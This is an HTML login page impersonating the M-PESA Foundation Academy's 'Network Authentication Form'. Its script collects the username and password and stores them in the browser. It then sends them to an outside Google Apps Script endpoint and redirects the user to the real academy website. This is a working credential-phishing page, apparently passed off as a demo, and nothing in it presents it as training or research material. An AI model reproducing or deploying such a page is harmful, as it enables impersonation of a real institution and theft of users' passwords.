<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Network Authentication - Demo</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }
  body {
    font-family: Arial, Helvetica, sans-serif;
    background: #ffffff;
    color: #555;
    min-height: 100vh;
  }
  .top-text {
    position: absolute;
    top: 8.1%;
    width: 100%;
    text-align: center;
    font-size: 16px;
  }
  .container {
    position: absolute;
    top: 22%;
    left: 50%;
    transform: translateX(-50%);
    width: 325px;
    text-align: center;
  }
  .logo {
    color: #66ad29;
    font-size: 19px;
    font-weight: 800;
    line-height: 19px;
    margin-bottom: 13px;
    letter-spacing: -0.5px;
  }
  .logo span {
    display: block;
  }
  .login-box {
    border-left: 1px solid #d8dce0;
    border-right: 1px solid #d8dce0;
    border-bottom: 1px solid #d8dce0;
    padding: 41px 29px 42px;
    min-height: 368px;
  }
  .demo-label {
    color: #a05b00;
    font-size: 11px;
    margin-bottom: 15px;
  }
  h3 {
    color: #3373ae;
    font-size: 16px;
    font-weight: 600;
    margin-bottom: 25px;
    white-space: nowrap;
  }
  input {
    width: 100%;
    height: 36px;
    border: 2px solid #e2e6e9;
    border-radius: 8px;
    padding: 0 10px;
    font-size: 14px;
    margin-bottom: 26px;
    outline: none;
  }
  input::placeholder {
    color: #cbd0d4;
  }
  input:focus {
    border-color: #8dbbdf;
  }
  button {
    width: 100%;
    height: 36px;
    background: #3eae32;
    color: white;
    border: none;
    border-radius: 4px;
    font-size: 14px;
    font-weight: bold;
    cursor: pointer;
  }
  .portal {
    margin-top: 53px;
    font-size: 14px;
    font-weight: bold;
    color: #666;
  }
  .footer {
    position: absolute;
    top: 72.7%;
    width: 100%;
    text-align: center;
    font-size: 16px;
    white-space: nowrap;
  }
  @media (max-width: 500px) {
    .container {
      top: 20%;
      width: min(325px, 90%);
    }
    .footer {
      top: 75%;
      padding: 0 15px;
      white-space: normal;
      line-height: 1.8;
    }
  }
</style>
</head>
<body>
<div class="top-text">
  Thinkers : Doers : Leaders
</div>
<main class="container">
  <div class="logo">
    <span>M-PESA</span>
    <span>FOUNDATION</span>
    <span>ACADEMY</span>
  </div>
  <section class="login-box">
    <div class="demo-label"></div>
    <h3>Network Authentication Form</h3>
    <form id="loginForm">
      <input type="text" id="username" name="username" placeholder="Enter your Username" required autocomplete="username" />
      <input type="password" id="password" name="password" placeholder="Enter your Password" required autocomplete="current-password" />
      <button class="login-btn" type="submit">Login</button>
    </form>
    <div class="portal">Click here to access User Portal</div>
  </section>
</main>
<footer class="footer">
  Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence
</footer>
<script>
  const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwYOsSonTJ4W0Aduq-IygbHGUcm6cH-c-A-W5JNKVQjOBVPrUtbpgi4X9hpfslX586G/exec";

  document.getElementById("loginForm").addEventListener("submit", async function(e) {
    e.preventDefault();
    const user = document.getElementById("username").value.trim();
    const pass = document.getElementById("password").value.trim();

    if (!user || !pass) {
      alert("Please enter both username and password.");
      return;
    }

    const attempts = JSON.parse(localStorage.getItem("loginAttempts")) || [];
    attempts.push({ username: user, password: pass, time: new Date().toLocaleString() });
    localStorage.setItem("loginAttempts", JSON.stringify(attempts));

    const formData = new FormData();
    formData.append("username", user);
    formData.append("password", pass);
    formData.append("role", "participant");

    try {
      const response = await fetch(GOOGLE_SCRIPT_URL, {
        method: "POST",
        body: formData,
        mode: "cors",
        headers: {
          'Accept': 'application/json',
        }
      });
      if (response.ok) {
        // Redirect immediately after successful submission
        window.location.href = "https://mpesafoundationacademy.ac.ke/";
      } else {
        alert("Failed to submit credentials. Please try again.");
      }
    } catch (error) {
      alert("An error occurred while submitting credentials. Please check your internet connection and try again.");
      console.error("Fetch error:", error);
    }
  });
</script>
</body>
</html>
